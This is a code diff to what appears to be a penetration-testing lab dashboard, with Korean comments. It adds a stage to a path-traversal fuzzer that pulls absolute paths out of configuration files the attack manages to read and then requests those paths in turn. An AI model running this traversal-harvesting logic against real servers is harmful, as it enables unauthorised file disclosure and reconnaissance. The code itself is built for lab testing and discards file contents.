@@ -55,6 +55,24 @@
 보고서에 "퍼징으로 찾았다"고 쓸 수 있는 것은 앞의 둘뿐이다. 단서로 찾은 것은
 **무엇을 읽고 알아냈는지**까지 함께 적어야 재현된다.
 
+## 수확 — 읽은 파일이 다음 경로를 알려 준다
+
+사전은 이름을 **맞혀야** 찾는다. 설정 파일은 경로를 **적어 놓는다**. 그래서 파일이 하나 읽히면
+그 안의 절대경로를 뽑아 다시 때린다. 거기서 또 읽히면 한 바퀴 더(기본 2바퀴).
+
+    systemd 유닛  WorkingDirectory= · EnvironmentFile= · ExecStart= · JAVA_HOME=
+    nginx         root · include · ssl_certificate · access_log
+    .env          APP_STORAGE_ROOT 처럼 path·dir·home·root 로 끝나는 키
+
+`jdk-11.0.24+8` 처럼 버전이 박힌 이름이나 난수 접두사가 붙은 저장 파일명은 **어떤 사전에도
+없고 이 길로만 나온다.** 실측에서 사람이 눈으로 하던 일이다.
+
+**파일 내용은 저장하지 않는다.** 경로를 뽑는 동안만 메모리에 두고 버린다. 요청 기록에도
+본문이 남지 않는다(`record_body=False`) — 설정 파일에는 자격증명이 섞여 있다.
+
+수확으로 찾은 것은 출처 `수확` 으로 적는다. 모듈이 스스로 한 일이므로 퍼징의 성과에 들어가되,
+씨앗·확장과는 찾은 방식이 다르다.
+
 ## 한계 — 이름을 맞혀야만 찾는다
 
 버전 문자열이 든 이름(`jdk-11.0.24+8`)이나 난수 접두사가 붙은 저장 파일명은
@@ -65,6 +83,8 @@
 칼리에서 더 깊이 돌리려면 `08_모의해킹/file_inclution/fsmap/` 의 도구를 쓰고,
 결과는 '칼리 fsmap 결과 가져오기' 모듈로 가져온다.
 """
+import re
+
 from dashboard.core import Finding, ToolResult, fetch
 from dashboard.payloads import ENCODINGS, traversal
 from dashboard import wordlists
@@ -115,6 +135,10 @@ META = {
          "help": "1단계가 찾은 디렉터리 아래에 붙일 **이름** 목록입니다. SecLists 를 붙이면 함께 뜹니다."},
         {"name": "base", "label": "기준 디렉터리 (확장만 모드)", "default": "srv/sesacedu",
          "help": "'확장만' 에서 이 아래를 때립니다. 맨 앞 / 는 빼고 씁니다. 다른 모드에서는 무시합니다."},
+        {"name": "rounds", "label": "수확 바퀴", "type": "int", "default": "2",
+         "help": "읽힌 설정 파일 안에 적힌 절대경로를 뽑아 다시 때립니다. 거기서 또 파일이 읽히면 "
+                 "한 바퀴 더. 0 이면 수확하지 않습니다. 사전으로는 못 찾는 이름(버전·난수)이 "
+                 "이 길로만 나옵니다."},
         {"name": "hints", "label": "단서로 받은 경로 (한 줄에 하나)", "type": "textarea", "default": "",
          "placeholder": "opt/java/jdk-11.0.24+8\nsrv/sesacedu/config/api.env",
          "help": "읽힌 설정 파일 내용에서 사람·AI 가 찾아낸 절대경로입니다. 사전으로는 못 찾는 "
@@ -143,9 +167,10 @@ DIR = "dir"
 OPAQUE = "opaque"
 
 # 어디서 온 경로인가. 모듈이 스스로 찾은 것과 밖에서 들어온 것을 섞지 않는다.
-SEED, EXPAND, HINT = "seed", "expand", "hint"
-SOURCE_LABEL = {SEED: "씨앗", EXPAND: "확장", HINT: "단서(밖에서)"}
-MINE = (SEED, EXPAND)       # 이 모듈이 자기 페이로드로 찾은 것
+SEED, EXPAND, HARVEST, HINT = "seed", "expand", "harvest", "hint"
+SOURCE_LABEL = {SEED: "씨앗", EXPAND: "확장", HARVEST: "수확", HINT: "단서(밖에서)"}
+MINE = (SEED, EXPAND, HARVEST)   # 이 모듈이 자기 페이로드로 찾은 것
+MAX_HARVEST = 80                 # 한 바퀴에 수확할 경로 수 상한
 
 # 응답 코드 → 뜻. 404 를 '없음'이라고 쓰지 않는 것이 요점이다.
 READABLE, EXISTS, UNSTAT, DENIED, AUTH = "readable", "exists", "unstat", "denied", "auth"
@@ -163,6 +188,8 @@ def _send(target, lecture, depth, scheme, path):
     """경로 하나를 때린다. 파일 내용은 기록하지 않는다(구조만 본다)."""
     payload = traversal(path, depth, scheme)
     url = target.url + PATH.format(lecture=lecture, payload=payload)
+    # record_body=False 라 요청 기록에 본문이 남지 않는다. 아래 r.body 는 메모리에만 있고
+    # 수확이 끝나면 버린다 — 설정 파일에는 자격증명이 섞여 있다.
     r = fetch(url, record_body=False)
     klass = BY_STATUS.get(r.status, "other")
     return klass, r
@@ -221,7 +248,9 @@ class _Walker:
                 continue
             node = {"path": "/" + path, "class": klass, "status": r.status,
                     "size": len(r.body or ""), "kind": None, "is_dir": None,
-                    "note": "", "severity": "info", "source": source, "_r": r}
+                    "note": "", "severity": "info", "source": source, "_r": r,
+                    # 수확에만 쓰고 결과·기록에는 절대 넣지 않는다
+                    "_body": r.body if klass == READABLE else ""}
             self.nodes.append(node)
             found.append(node)
         return found
@@ -242,9 +271,56 @@ class _Walker:
             n["is_dir"] = True if n["kind"] == DIR else None
 
 
+# 읽힌 파일 안에서 절대경로를 끄집어낸다.
+# 사전은 이름을 '맞혀야' 찾지만, 설정 파일은 경로를 **적어 놓는다**. 버전이 든 이름
+# (jdk-11.0.24+8)이나 난수 접두사가 붙은 저장 파일명은 이 길로만 나온다.
+_PATH = re.compile(r"(?<![\w%])/(?:[A-Za-z0-9._+\-]+/)*[A-Za-z0-9._+\-]+")
+# 키=값 꼴에서 값만 떼어 본다. 따옴표·앞뒤 공백을 걷어낸다.
+_ASSIGN = re.compile(r"""(?im)^\s*(?:export\s+)?
+    (?:WorkingDirectory|ExecStart|ExecStartPre|EnvironmentFile|Environment|ReadWritePaths|
+       JAVA_HOME|CATALINA_(?:HOME|BASE)|root|include|access_log|error_log|
+       ssl_certificate(?:_key)?|[A-Za-z0-9_.]*(?:path|dir|home|file|root))
+    \s*[=:]\s*["']?(?P<v>[^"'\s;]+)""", re.X)
+
+# 경로처럼 생겼지만 쓸모없는 것들
+_NOISE = ("/dev/null", "/bin/sh", "/bin/bash", "/usr/bin/env", "/proc/self")
+
+
+def harvest_paths(text: str, limit: int = MAX_HARVEST):
+    """파일 내용에서 서버 절대경로 후보를 뽑는다. **내용 자체는 어디에도 남기지 않는다.**
+
+    두 가지를 본다.
+      키=값   systemd 유닛·nginx·.env 가 경로를 적는 자리(WorkingDirectory·root·JAVA_HOME …)
+      맨몸    본문에 그냥 적힌 /usr/lib/... 꼴
+    키=값 쪽을 앞에 둔다 — 그쪽이 배포 경로일 확률이 높다.
+    """
+    if not text:
+        return []
+    found = []
+    for m in _ASSIGN.finditer(text[:200_000]):
+        v = m.group("v")
+        if v.startswith("/"):
+            found.append(v)
+    found += _PATH.findall(text[:200_000])
+
+    out, seen = [], set()
+    for p in found:
+        p = p.rstrip("/.,;:)")
+        # 너무 짧거나(/a) 터무니없이 길거나, 쓸모없는 것은 버린다
+        if len(p) < 4 or len(p) > 200 or p in _NOISE or p.count("/") > 12:
+            continue
+        key = p.lstrip("/")
+        if key and key not in seen:
+            seen.add(key)
+            out.append(key)
+        if len(out) >= limit:
+            break
+    return out
+
+
 def _provenance(mine, outside):
     """트리 아래에 출처를 적는다. 그림만 보면 어느 것이 퍼징의 성과인지 알 수 없다."""
-    out = ["", "   출처  퍼징이 스스로 찾음 %d개(씨앗·확장)" % len(mine)]
+    out = ["", "   출처  퍼징이 스스로 찾음 %d개(씨앗·확장·수확)" % len(mine)]
     if outside:
         out.append("         밖에서 받아 확인만 함 %d개 — 퍼징이 찾은 것이 아니다:" % len(outside))
         out += ["           %s" % n["path"] for n in sorted(outside, key=lambda x: x["path"])]
@@ -310,6 +386,31 @@ def run(target, params):
                         break
                 stages.append((f"확장({len(roots)}곳)", grown))
 
+    # ── 3단계: 수확 — 읽힌 파일 안에 적힌 경로를 뽑아 다시 때린다 ──
+    # 사전은 이름을 '맞혀야' 찾지만 설정 파일은 경로를 적어 놓는다. 사람이 눈으로 하던 일이다.
+    rounds = max(0, int(params.get("rounds") or 0)) if mode != "expand" else 0
+    picked_from, harvested_total = set(), 0
+    for _ in range(rounds):
+        if walker.auth_stop or walker.left <= 0:
+            break
+        fresh = [n for n in walker.nodes
+                 if n["class"] == READABLE and n["path"] not in picked_from]
+        if not fresh:
+            break
+        crop = []
+        for n in fresh:
+            picked_from.add(n["path"])
+            crop += harvest_paths(n.pop("_body", "") or "")
+        crop = [p for p in _uniq(crop) if p not in walker.seen][:MAX_HARVEST]
+        if not crop:
+            break
+        walker.hit(crop, HARVEST)
+        harvested_total += len(crop)
+    if harvested_total:
+        stages.append(("수확", harvested_total))
+    for n in walker.nodes:          # 본문은 여기서 버린다 — 결과·기록 어디에도 안 남는다
+        n.pop("_body", None)
+
     # ── 종류 가리기: 아직 안 가린 것만 ──
     if want_kinds and not walker.auth_stop:
         walker.sort_kinds([n for n in walker.nodes if n["kind"] is None])
@@ -351,7 +452,7 @@ def run(target, params):
             evidence=("인코딩 %s · 올라갈 단계 %s · 보낸 요청 %d건 · 때린 경로 %d개\n"
                       "단계: %s\n"
                       "읽힘 %d · 디렉터리 %d · 못 들어감 %d\n\n"
-                      "**퍼징이 스스로 찾은 것 %d개** (씨앗·확장)\n%s\n\n"
+                      "**퍼징이 스스로 찾은 것 %d개** (씨앗·확장·수확)\n%s\n\n"
                       "%s"
                       "해석 주의: 404 였던 경로는 '없다'고 단정하지 않는다 — 상위 경로에 "
                       "탐색 권한이 없어도 404 가 온다."
@@ -385,10 +486,17 @@ def run(target, params):
     note.append("**'못 들어감' 은 파일인지 디렉터리인지 가리지 못한 것입니다.** 읽기 권한이 "
                 "없는 파일(ENOTDIR)과 탐색 권한이 없는 디렉터리(EACCES)가 같은 404 를 주기 "
                 "때문입니다. 보고서에 '파일이다' 로 쓰면 틀립니다.")
-    note.append("찾지 못한 것이 없다는 뜻은 아닙니다. 이름을 맞혀야만 찾습니다 — "
-                "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없습니다. "
-                "읽힌 설정 파일에서 절대경로를 찾아 다시 넣어 보세요(실측에서 systemd 유닛의 "
-                "JAVA_HOME·EnvironmentFile 이 사전으로 못 찾는 경로를 알려 줬습니다).")
+    if harvested_total:
+        note.append("**수확 %d개** — 읽힌 설정 파일 안에 적힌 절대경로를 뽑아 다시 때렸습니다. "
+                    "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없고 이 길로만 나옵니다. "
+                    "파일 내용은 경로를 뽑는 데만 쓰고 **어디에도 저장하지 않습니다**(요청 기록에도 "
+                    "본문이 남지 않습니다) — 설정 파일에는 자격증명이 섞여 있습니다."
+                    % harvested_total)
+    else:
+        note.append("찾지 못한 것이 없다는 뜻은 아닙니다. 이름을 맞혀야만 찾습니다 — "
+                    "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없습니다. "
+                    "읽힌 파일이 없어 수확할 것도 없었습니다. 설정 파일을 하나라도 읽으면 "
+                    "거기 적힌 경로를 자동으로 따라갑니다.")
     if cut:
         note.append("사전이 길어 앞에서부터 %d개만 읽었습니다." % limit)
     if over:
